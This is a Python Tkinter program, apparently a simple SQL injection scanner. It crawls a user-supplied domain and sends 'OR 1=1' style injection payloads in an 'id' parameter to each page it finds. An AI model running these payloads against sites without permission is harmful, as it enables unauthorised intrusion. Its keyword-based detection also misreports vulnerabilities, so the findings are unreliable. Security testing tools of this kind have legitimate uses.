import tkinter as tk
from tkinter import ttk, filedialog
import requests
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import threading

class SQLInjectionScanner:
    def __init__(self, url):
        self.url = url
        self.visited_urls = set()
        self.vulnerabilities = []

    def scan_sql_injection(self, url):
        try:
            payloads = ["' OR '1'='1", '" OR "1"="1', "' OR '1'='1' --", '" OR "1"="1" --']
            for payload in payloads:
                injected_url = f"{url}?id={payload}"
                response = requests.get(injected_url)
                if "database" in response.text.lower() or "sql" in response.text.lower() or "error" in response.text.lower():
                    self.vulnerabilities.append(f'SQL Injection detected at {injected_url}')
            self.crawl(url)
        except Exception as e:
            self.vulnerabilities.append(f'Error: {e} at {url}')

    def crawl(self, url):
        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.content, 'html.parser')
            for link in soup.find_all('a', href=True):
                href = link['href']
                full_url = urljoin(self.url, href)
                if full_url not in self.visited_urls and self.url in full_url:
                    self.visited_urls.add(full_url)
                    self.scan_sql_injection(full_url)
        except Exception as e:
            self.vulnerabilities.append(f'Error: {e} during crawling at {url}')

    def get_vulnerabilities(self):
        return self.vulnerabilities

# Define the scanning process status
is_scanning = False
is_paused = False
scanner_thread = None

def start_scan():
    global is_scanning, is_paused, scanner_thread
    if is_scanning:
        return
    is_scanning = True
    is_paused = False
    domain_name = entry_domain.get()
    if not domain_name.startswith('http://') and not domain_name.startswith('https://'):
        domain_name = 'http://' + domain_name
    scanner_thread = threading.Thread(target=scan, args=(domain_name,))
    scanner_thread.start()

def stop_scan():
    global is_scanning, scanner_thread
    is_scanning = False
    if scanner_thread:
        scanner_thread.join()
        scanner_thread = None

def pause_scan():
    global is_paused
    is_paused = not is_paused

def restart_scan():
    stop_scan()
    start_scan()

def scan(domain_name):
    global is_scanning, is_paused
    scanner = SQLInjectionScanner(domain_name)
    scanner.scan_sql_injection(domain_name)
    vulnerabilities = scanner.get_vulnerabilities()
    result_text.delete(1.0, tk.END)
    for vuln in vulnerabilities:
        if not is_scanning:
            break
        while is_paused:
            pass
        result_text.insert(tk.END, f'{vuln}\n')
    progress_bar["value"] = 1

def save_to_file():
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
    if file_path:
        with open(file_path, "w") as file:
            file.write(result_text.get("1.0", tk.END))

# Create the main window
root = tk.Tk()
root.title("SQL Injection Vulnerability Scanner")

# Define a toolbar frame
toolbar = tk.Frame(root, bd=1, relief=tk.RAISED)
toolbar.pack(side="top", fill="x")

# Add toolbar buttons
start_btn = tk.Button(toolbar, text="Start", command=start_scan)
start_btn.pack(side="left", padx=2, pady=2)

stop_btn = tk.Button(toolbar, text="Stop", command=stop_scan)
stop_btn.pack(side="left", padx=2, pady=2)

restart_btn = tk.Button(toolbar, text="Restart", command=restart_scan)
restart_btn.pack(side="left", padx=2, pady=2)

pause_btn = tk.Button(toolbar, text="Pause", command=pause_scan)
pause_btn.pack(side="left", padx=2, pady=2)

save_btn = tk.Button(toolbar, text="Save to File", command=save_to_file)
save_btn.pack(side="left", padx=2, pady=2)

# Frame for input fields
input_frame = tk.Frame(root)
input_frame.pack(pady=5)

# Entry widget for target domain input
tk.Label(input_frame, text="Target Domain Name:").pack(side="left", padx=5)
entry_domain = tk.Entry(input_frame, width=30)
entry_domain.pack(side="left", padx=5)

# Create a progress bar
progress_bar = ttk.Progressbar(root, orient="horizontal", length=400, mode="determinate")
progress_bar.pack(pady=5)

# Create a frame for the Text widget and scrollbars
text_frame = tk.Frame(root)
text_frame.pack(expand=1, fill="both")

# Add a vertical scrollbar
v_scrollbar = tk.Scrollbar(text_frame, orient="vertical")
v_scrollbar.pack(side="right", fill="y")

# Add a horizontal scrollbar
h_scrollbar = tk.Scrollbar(text_frame, orient="horizontal")
h_scrollbar.pack(side="bottom", fill="x")

# Create a Text widget for displaying results
result_text = tk.Text(text_frame, wrap="none", font=("Courier", 12),
                      yscrollcommand=v_scrollbar.set, xscrollcommand=h_scrollbar.set)
result_text.pack(expand=1, fill="both")

# Configure the scrollbars
v_scrollbar.config(command=result_text.yview)
h_scrollbar.config(command=result_text.xview)

# Run the application
root.mainloop()

